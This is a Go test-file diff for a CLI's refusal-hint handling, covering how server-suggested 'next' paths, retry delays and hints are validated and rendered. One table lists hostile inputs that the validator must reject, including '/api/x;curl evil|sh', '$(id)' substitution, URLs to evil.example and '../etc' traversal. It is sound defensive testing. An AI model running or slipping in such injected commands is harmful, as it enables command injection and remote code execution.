@@ -3,8 +3,10 @@ package utils
 import (
 	"errors"
 	"fmt"
+	"net/http"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
@@ -275,4 +277,184 @@ func TestHintOnly(t *testing.T) {
 	plain := HintOnly("timed out", nil)
 	assert.Equal(t, "timed out", plain.Error())
 	assert.Empty(t, RefusalHint(plain))
+}
+
+func TestHintOnly_CarriesNoNextOrRetry(t *testing.T) {
+	t.Parallel()
+	refusal := &refusedError{hint: sampleHint, next: "/api/approvals/7/", gate: "rate", retryAfter: time.Minute}
+
+	got := RefusalNextActions(HintOnly("timed out", refusal))
+
+	assert.Equal(t, []NextAction{{Description: sampleHint}}, got)
+}
+
+// refusedError stands in for the client's coded refusal with its whole envelope.
+type refusedError struct {
+	hint, next, gate string
+	retryAfter       time.Duration
+}
+
+func (e *refusedError) Error() string             { return "permission denied" }
+func (e *refusedError) ErrorCode() string         { return "future_denied" }
+func (e *refusedError) ErrorSource() string       { return "" }
+func (e *refusedError) ErrorHint() string         { return e.hint }
+func (e *refusedError) ErrorNext() string         { return e.next }
+func (e *refusedError) ErrorGate() string         { return e.gate }
+func (e *refusedError) ErrorMissing() []string    { return nil }
+func (e *refusedError) RetryAfter() time.Duration { return e.retryAfter }
+
+func TestRefusalNextActions_NextMustBeASelfRelativePath(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name string
+		next string
+		want bool
+	}{
+		{name: "a path", next: "/api/approvals/7/", want: true},
+		{name: "empty", next: ""},
+		{name: "no leading slash", next: "api/approvals/7/"},
+		{name: "protocol relative", next: "//evil.example/x"},
+		{name: "absolute URL", next: "https://evil.example/x"},
+		{name: "backslash", next: `/a\b`},
+		{name: "escape sequence", next: "/a\x1b[2Kb"},
+		{name: "newline", next: "/a\nb"},
+		{name: "format character", next: "/a\u202eb"},
+		{name: "surrounding space", next: "/api/x/ "},
+		{name: "inner space", next: "/api/x y/"},
+		{name: "semicolon", next: "/api/x;curl evil|sh"},
+		{name: "command substitution", next: "/api/$(id)/"},
+		{name: "backtick", next: "/api/`id`/"},
+		{name: "dot dot segment", next: "/api/../etc/"},
+		{name: "dot segment", next: "/api/./x/"},
+		{name: "query", next: "/api/x/?page=2&size=1"},
+		{name: "fragment", next: "/api/x/#top"},
+		{name: "no trailing slash", next: "/api/approvals/7", want: true},
+		{name: "over long", next: "/" + strings.Repeat("a", MaxServerHintBytes)},
+		{name: "at the cap", next: "/" + strings.Repeat("a", MaxServerHintBytes-1), want: true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			got := RefusalNextActions(&refusedError{next: tt.next})
+
+			if !tt.want {
+				assert.Empty(t, got)
+				return
+			}
+			assert.Equal(t, []NextAction{{
+				Command:     "alpacon api " + tt.next,
+				Description: "Where the server says to check on this refusal",
+			}}, got)
+		})
+	}
+}
+
+func TestRefusalNextActions_NextIsFoundInTheChain(t *testing.T) {
+	t.Parallel()
+	err := fmt.Errorf("failed: %w", &refusedError{next: "/api/approvals/7/"})
+
+	got := RefusalNextActions(err)
+
+	require.Len(t, got, 1)
+	assert.Equal(t, "alpacon api /api/approvals/7/", got[0].Command)
+}
+
+func TestRefusalNextActions_JoinedRefusalsShowTheFirstNext(t *testing.T) {
+	t.Parallel()
+	err := errors.Join(&refusedError{next: "/api/approvals/7/"}, &refusedError{next: "/api/approvals/8/"})
+
+	got := RefusalNextActions(err)
+
+	require.Len(t, got, 1)
+	assert.Equal(t, "alpacon api /api/approvals/7/", got[0].Command)
+}
+
+func TestParseRefusalNext(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name   string
+		status int
+		body   string
+		want   string
+	}{
+		{name: "403", status: http.StatusForbidden, body: `{"code": "x", "next": "/api/approvals/7/"}`, want: "/api/approvals/7/"},
+		{name: "402", status: http.StatusPaymentRequired, body: `{"code": "x", "next": "/api/approvals/7/"}`, want: "/api/approvals/7/"},
+		{name: "400 field of that name", status: http.StatusBadRequest, body: `{"code": "x", "next": "/api/approvals/7/"}`},
+		{name: "401", status: http.StatusUnauthorized, body: `{"code": "x", "next": "/api/approvals/7/"}`},
+		{name: "not a string", status: http.StatusForbidden, body: `{"code": "x", "next": ["/api/approvals/7/"]}`},
+		{name: "absent", status: http.StatusForbidden, body: `{"code": "x"}`},
+		{name: "not JSON", status: http.StatusForbidden, body: `<html></html>`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			assert.Equal(t, tt.want, ParseRefusalNext([]byte(tt.body), tt.status))
+		})
+	}
+}
+
+func TestRawTerminalHintLines_EndEveryActionWithCarriageReturn(t *testing.T) {
+	pinColor(t, false)
+	err := &refusedError{hint: sampleHint, next: "/api/approvals/7/", gate: "rate", retryAfter: 30 * time.Second}
+
+	got := RawTerminalHintLines(err)
+
+	assert.Equal(t, "Hint: "+sampleHint+"\r\n"+
+		"Hint: alpacon api /api/approvals/7/  # Where the server says to check on this refusal\r\n"+
+		"Hint: Retry after 30s\r\n", got)
+}
+
+func TestRefusalNextActions_RetryAfter(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name string
+		err  *refusedError
+		want []NextAction
+	}{
+		{name: "gated refusal", err: &refusedError{gate: "rate", retryAfter: 30 * time.Second}, want: []NextAction{{Description: "Retry after 30s"}}},
+		{name: "rounded up to whole seconds", err: &refusedError{gate: "rate", retryAfter: 1500 * time.Millisecond}, want: []NextAction{{Description: "Retry after 2s"}}},
+		{name: "no gate", err: &refusedError{retryAfter: 30 * time.Second}},
+		{name: "plan gate states the reset itself", err: &refusedError{gate: "plan", retryAfter: 30 * time.Second}},
+		{name: "no delay", err: &refusedError{gate: "rate"}},
+		{name: "largest header value", err: &refusedError{gate: "rate", retryAfter: 9223372036 * time.Second}, want: []NextAction{{Description: "Retry after 9223372036s"}}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			assert.Equal(t, tt.want, RefusalNextActions(tt.err))
+		})
+	}
+}
+
+func TestNewFailureEnvelope_NextActionsHoldHintThenNextThenRetry(t *testing.T) {
+	t.Parallel()
+	err := fmt.Errorf("failed to run: %w", &refusedError{hint: sampleHint, next: "/api/approvals/7/", gate: "rate", retryAfter: 30 * time.Second})
+	rendered, fmtErr := FormatJSON(newFailureEnvelope(ExitCodeGeneralError, "", "exec", err, "Failed to run."))
+	require.NoError(t, fmtErr)
+
+	assert.JSONEq(t, `{
+		"ok": false,
+		"exit_code": 1,
+		"error_code": "future_denied",
+		"message": "Failed to run.",
+		"context": {"operation": "exec"},
+		"retry_after": 30,
+		"next_actions": [
+			{"description": "`+sampleHint+`"},
+			{"command": "alpacon api /api/approvals/7/", "description": "Where the server says to check on this refusal"},
+			{"description": "Retry after 30s"}
+		]
+	}`, rendered)
+}
+
+func TestCliError_PrintsHintNextAndRetryLines(t *testing.T) {
+	pinColor(t, false)
+	err := &refusedError{hint: sampleHint, next: "/api/approvals/7/", gate: "rate", retryAfter: 30 * time.Second}
+
+	stderr := captureStderr(t, func() { CliError("failed to run: %s", err) })
+
+	assert.Contains(t, stderr, "Error: failed to run: permission denied\n"+
+		"Hint: "+sampleHint+"\n"+
+		"Hint: alpacon api /api/approvals/7/  # Where the server says to check on this refusal\n"+
+		"Hint: Retry after 30s\n")
 }
